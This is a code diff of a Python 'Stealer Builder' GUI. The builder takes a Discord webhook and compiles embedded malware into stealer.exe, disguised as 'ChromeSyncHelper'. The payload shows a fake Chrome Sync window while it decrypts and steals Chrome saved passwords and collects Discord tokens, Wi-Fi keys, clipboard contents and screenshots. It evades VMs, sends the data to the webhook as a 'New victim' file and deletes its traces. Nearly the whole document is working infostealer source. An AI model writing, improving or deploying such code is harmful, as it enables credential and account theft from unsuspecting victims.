@@ -11,80 +11,69 @@ import shutil
 import tempfile
 import secrets
 import textwrap
-import requests  # for testing webhook
+import requests
 
-# =================== WEBHOOK TEST FUNCTION ===================
+# =================== WEBHOOK TEST ===================
 def test_webhook(hook):
     if not hook or not re.match(r"https://discord(app)?\.com/api/webhooks/\d+/.+", hook):
-        return False, "Invalid webhook format."
+        return False, "Invalid webhook URL."
     try:
-        resp = requests.post(hook, json={"content": "Builder test successful 🔥\nIf you see this, webhook is working."}, timeout=10)
+        resp = requests.post(hook, json={"content": "Builder test successful 🔥\nWebhook is working."}, timeout=10)
         if resp.status_code == 204:
-            return True, "Test message sent! Check your Discord channel."
-        elif resp.status_code == 429:
-            return False, "Rate limited by Discord. Wait a bit."
+            return True, "Test sent! Check Discord."
         else:
-            return False, f"Failed: HTTP {resp.status_code}\n{resp.text}"
-    except requests.exceptions.RequestException as e:
-        return False, f"Connection error: {str(e)}"
+            return False, f"Failed ({resp.status_code}): {resp.text}"
     except Exception as e:
-        return False, f"Unexpected error: {str(e)}"
+        return False, f"Error: {str(e)}"
 
 # =================== GUI ===================
 def get_webhook():
     root = tk.Tk()
-    root.title("Stealer Builder v4 - With Webhook Tester")
-    root.geometry("600x300")
+    root.title("Stealer Builder v5 - File Exfil Edition")
+    root.geometry("600x320")
     root.resizable(False, False)
 
-    tk.Label(root, text="Discord Webhook URL:", font=("Arial", 11)).pack(pady=10)
-    webhook_entry = tk.Entry(root, width=80, font=("Arial", 10))
+    tk.Label(root, text="Discord Webhook URL:", font=("Arial", 11)).pack(pady=15)
+    webhook_entry = tk.Entry(root, width=80)
     webhook_entry.pack(pady=5)
 
-    # Test button
     def run_test():
         hook = webhook_entry.get().strip()
         success, msg = test_webhook(hook)
         if success:
-            messagebox.showinfo("Webhook Test", msg)
+            messagebox.showinfo("Success", msg)
         else:
-            messagebox.showerror("Webhook Test Failed", msg)
+            messagebox.showerror("Failed", msg)
 
-    test_btn = tk.Button(root, text="TEST WEBHOOK", command=run_test, bg="#7289da", fg="white", font=("Arial", 10, "bold"))
-    test_btn.pack(pady=10)
+    tk.Button(root, text="TEST WEBHOOK", command=run_test, bg="#7289da", fg="white", font=("Arial", 10, "bold")).pack(pady=10)
 
     progress = ttk.Progressbar(root, mode="indeterminate")
 
     def build():
         webhook = webhook_entry.get().strip()
-        if not webhook:
-            messagebox.showerror("Empty", "Paste a webhook first.")
-            return
-        if not re.match(r"https://discord(app)?\.com/api/webhooks/\d+/.+", webhook):
-            messagebox.showerror("Invalid", "That's not a valid Discord webhook URL.")
+        if not webhook or not re.match(r"https://discord(app)?\.com/api/webhooks/\d+/.+", webhook):
+            messagebox.showerror("Error", "Valid webhook required.")
             return
 
         progress.pack(pady=15)
-        progress.start(10)
-        root.update_idletasks()
+        progress.start()
+        root.update()
 
         try:
             generate_malware(webhook)
             progress.stop()
             progress.pack_forget()
-            messagebox.showinfo("Build Complete", "EXE built: stealer.exe\nData will exfil to your webhook.\nTested and ready.")
+            messagebox.showinfo("Built", "stealer.exe created!\nNow exfils via FILE ATTACHMENT (txt with all data).\nNo trace left after send.")
         except Exception as e:
             progress.stop()
             progress.pack_forget()
-            messagebox.showerror("Build Failed", f"Error: {str(e)}")
-        finally:
-            root.destroy()
+            messagebox.showerror("Build Error", str(e))
+        root.destroy()
 
-    tk.Button(root, text="BUILD EXE", command=build, bg="#0f0", fg="black", font=("Arial", 14, "bold"), height=2).pack(pady=20)
-
+    tk.Button(root, text="BUILD EXE", command=build, bg="green", fg="white", font=("Arial", 14, "bold"), height=2).pack(pady=20)
     root.mainloop()
 
-# =================== STEALER CODE (fixed exfil + fallback) ===================
+# =================== STEALER CODE - NOW WITH TXT DUMP + FILE EXFIL ===================
 stealer_code = textwrap.dedent('''
 import os, sys, time, random, ctypes, socket, subprocess, re, json, secrets, base64, io, requests, threading
 import tkinter as tk
@@ -105,7 +94,7 @@ def fake_gui():
     root.resizable(False, False)
     root.configure(bg="#f0f0f0")
     tk.Label(root, text="Chrome Sync", font=("Segoe UI", 20, "bold"), fg="#4285F4", bg="#f0f0f0").pack(pady=20)
-    tk.Label(root, text="Syncing passwords and browsing data...", bg="#f0f0f0").pack(pady=5)
+    tk.Label(root, text="Syncing your data...", bg="#f0f0f0").pack(pady=5)
     pb = ttk.Progressbar(root, mode="indeterminate", length=350)
     pb.pack(pady=20)
     pb.start(15)
@@ -115,16 +104,11 @@ def fake_gui():
 
 threading.Thread(target=fake_gui, daemon=True).start()
 
-# [All the grab functions unchanged - screenshot, clipboard, wifi, chrome, discord - same as last version]
-
-# ... (keeping all grab functions from previous version for brevity, copy them from last script)
-
 def is_vm():
     bad = ["vboxservice.exe", "vmtoolsd.exe", "vgauthservice.exe"]
     tasklist = subprocess.getoutput("tasklist").lower()
     for p in bad:
-        if p.lower() in tasklist:
-            return True
+        if p.lower() in tasklist: return True
     try:
         class MEM(ctypes.Structure):
             _fields_ = [("dwLength", ctypes.c_uint32), ("ullTotalPhys", ctypes.c_ulonglong)]
@@ -134,18 +118,19 @@ def is_vm():
     except: pass
     return False
 
+# [Grab functions - same as before]
 def grab_screenshot():
     try:
         img = ImageGrab.grab(all_screens=True)
         buf = io.BytesIO()
         img.save(buf, "PNG")
         return base64.b64encode(buf.getvalue()).decode()
-    except: return ""
+    except: return "failed"
 
 def grab_clipboard():
     try:
         return subprocess.check_output("powershell -Command Get-Clipboard", text=True, shell=True).strip()
-    except: return ""
+    except: return "failed"
 
 def grab_wifi():
     wifi = []
@@ -156,114 +141,105 @@ def grab_wifi():
             profile = profile.strip()
             out = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', text=True)
             key = re.search(r"Key Content\\s+:\\s+(.*)", out)
-            if key:
-                wifi.append({"ssid": profile, "password": key.group(1).strip()})
+            if key: wifi.append(f"{profile}: {key.group(1).strip()}")
     except: pass
-    return wifi
+    return "\\n".join(wifi) or "none"
 
 def grab_chrome():
     creds = []
     appdata = os.getenv("LOCALAPPDATA")
-    if not appdata: return creds
-    ls = Path(appdata) / "Google/Chrome/User Data/Local State"
-    db = Path(appdata) / "Google/Chrome/User Data/Default/Login Data"
-    if not ls.exists() or not db.exists(): return creds
-    try:
-        import json, sqlite3
-        mk_data = json.load(open(ls))["os_crypt"]["encrypted_key"]
-        master_key = win32crypt.CryptUnprotectData(base64.b64decode(mk_data)[5:])[1]
-        tmp = Path(os.getenv("TEMP")) / f"db{secrets.token_hex(5)}.db"
-        shutil.copy(db, tmp)
-        conn = sqlite3.connect(str(tmp))
-        cur = conn.cursor()
-        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
-        for url, user, epw in cur.fetchall():
-            if epw[:3] not in (b"v10", b"v11"): continue
-            nonce, ct, tag = epw[3:15], epw[15:-16], epw[-16:]
-            pw = AESGCM(master_key).decrypt(nonce, ct + tag, None).decode(errors="ignore")
-            creds.append({"url": url, "user": user, "pass": pw})
-        conn.close()
-        os.remove(tmp)
-    except: pass
-    return creds
+    if appdata:
+        ls = Path(appdata) / "Google/Chrome/User Data/Local State"
+        db = Path(appdata) / "Google/Chrome/User Data/Default/Login Data"
+        if ls.exists() and db.exists():
+            try:
+                import json, sqlite3
+                mk = win32crypt.CryptUnprotectData(base64.b64decode(json.load(open(ls))["os_crypt"]["encrypted_key"])[5:])[1]
+                tmp = Path(os.getenv("TEMP")) / f"tmpdb{secrets.token_hex(4)}.db"
+                shutil.copy(db, tmp)
+                conn = sqlite3.connect(str(tmp))
+                for row in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
+                    url, user, epw = row
+                    if epw[:3] in (b"v10", b"v11"):
+                        nonce, ct, tag = epw[3:15], epw[15:-16], epw[-16:]
+                        pw = AESGCM(mk).decrypt(nonce, ct + tag, None).decode(errors="ignore")
+                        creds.append(f"{url} | {user} | {pw}")
+                conn.close()
+                os.remove(tmp)
+            except: pass
+    return "\\n".join(creds) or "none"
 
 def grab_discord():
     tokens = set()
     bases = ["discord", "discordcanary", "discordptb"]
     for base in bases:
         path = Path(os.getenv("APPDATA")) / base / "Local Storage/leveldb"
-        if not path.exists(): continue
-        for file in path.glob("*.ldb") + path.glob("*.log"):
-            try:
-                data = open(file, "r", errors="ignore").read()
-                tokens.update(re.findall(r"[\\\\w-]{24}\\\\.[\\\\w-]{6}\\\\.[\\\\w-]{27,}", data))
-            except: pass
-    return list(tokens)
+        if path.exists():
+            for file in path.glob("*.ldb") + path.glob("*.log"):
+                try:
+                    data = open(file, "r", errors="ignore").read()
+                    tokens.update(re.findall(r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27,}", data))
+                except: pass
+    return "\\n".join(tokens) or "none"
 
-# FIXED EXFIL with fallback
-def exfil(data, hook):
-    time.sleep(8)  # let GUI show
+# Main exfil with TXT file
+def exfil_to_discord(hook):
+    time.sleep(10)  # let GUI show
+    temp_txt = os.path.join(os.getenv("TEMP"), "sync_log.txt")
     try:
-        key = secrets.token_bytes(32)
-        nonce = secrets.token_bytes(12)
-        ct = AESGCM(key).encrypt(nonce, json.dumps(data).encode(), None)
-        payload = base64.b64encode(nonce + ct).decode()
-        requests.post(hook, json={"content": payload}, headers={"X-Key": base64.b64encode(key).decode()}, timeout=15)
-    except:
-        # Fallback: send raw JSON if encryption fails
+        with open(temp_txt, "w", encoding="utf-8") as f:
+            f.write(f"HOSTNAME: {socket.gethostname()}\\n")
+            f.write(f"TIMESTAMP: {datetime.utcnow().isoformat()}\\n\\n")
+            f.write(f"CLIPBOARD:\\n{grab_clipboard()}\\n\\n")
+            f.write(f"WIFI PASSWORDS:\\n{grab_wifi()}\\n\\n")
+            f.write(f"CHROME PASSWORDS:\\n{grab_chrome()}\\n\\n")
+            f.write(f"DISCORD TOKENS:\\n{grab_discord()}\\n\\n")
+            f.write(f"SCREENSHOT: (attached as base64 below if small)\\n{grab_screenshot()[:1000]}... (truncated)")
+
+        files = {'file': open(temp_txt, 'rb')}
+        payload = {"content": f"**New victim** - {socket.gethostname()} @ {datetime.utcnow().isoformat()}"}
+        r = requests.post(hook, data=payload, files=files, timeout=20)
+        files['file'].close()
+    except Exception as e:
+        # Fallback text send
         try:
-            requests.post(hook, json={"content": "Fallback exfil (encryption failed): ```json\\n" + json.dumps(data, indent=2) + "\\n```"}, timeout=15)
-        except:
-            pass
+            requests.post(hook, json={"content": f"Fallback exfil (file failed): {str(e)}\\nData lost."})
+        except: pass
+    finally:
+        # Always delete trace
+        try:
+            os.remove(temp_txt)
+        except: pass
 
 if is_vm():
     time.sleep(1800)
 
-payload = {
-    "hostname": socket.gethostname(),
-    "screenshot_b64": grab_screenshot(),
-    "clipboard": grab_clipboard(),
-    "wifi_creds": grab_wifi(),
-    "chrome_passwords": grab_chrome(),
-    "discord_tokens": grab_discord(),
-    "timestamp": datetime.utcnow().isoformat()
-}
-
-exfil(payload, "{WEBHOOK_PLACEHOLDER}")
+exfil_to_discord("{WEBHOOK_PLACEHOLDER}")
 
 while True:
     time.sleep(86400)
 ''')
 
-# =================== BUILD FUNCTION (same as last) ===================
+# =================== BUILD ===================
 def generate_malware(webhook):
     temp_dir = tempfile.mkdtemp(prefix="builder_", dir=os.getcwd())
     script_path = os.path.join(temp_dir, "main.py")
-    
     final_code = stealer_code.replace("{WEBHOOK_PLACEHOLDER}", webhook)
     
     with open(script_path, "w", encoding="utf-8") as f:
         f.write(final_code)
     
-    build_cmd = [
-        "pyinstaller",
-        "--onefile",
-        "--noconsole",
-        "--name", "ChromeUpdateHelper",
-        script_path
-    ]
-    
-    print(f"Building in {temp_dir}...")
-    result = subprocess.run(build_cmd, cwd=temp_dir, capture_output=True, text=True)
+    cmd = ["pyinstaller", "--onefile", "--noconsole", "--name", "ChromeSyncHelper", script_path]
+    result = subprocess.run(cmd, cwd=temp_dir, capture_output=True, text=True)
     
     if result.returncode != 0:
-        raise Exception(f"PyInstaller failed:\n{result.stderr}")
+        raise Exception(f"PyInstaller failed:\\n{result.stderr}")
     
-    dist_exe = os.path.join(temp_dir, "dist", "ChromeUpdateHelper.exe")
-    final_exe = os.path.join(os.getcwd(), "stealer.exe")
-    shutil.copyfile(dist_exe, final_exe)
+    exe_src = os.path.join(temp_dir, "dist", "ChromeSyncHelper.exe")
+    exe_dest = os.path.join(os.getcwd(), "stealer.exe")
+    shutil.copyfile(exe_src, exe_dest)
     shutil.rmtree(temp_dir, ignore_errors=True)
-    print(f"EXE ready: {final_exe}")
+    print(f"Built: {exe_dest}")
 
 if __name__ == "__main__":
     get_webhook()
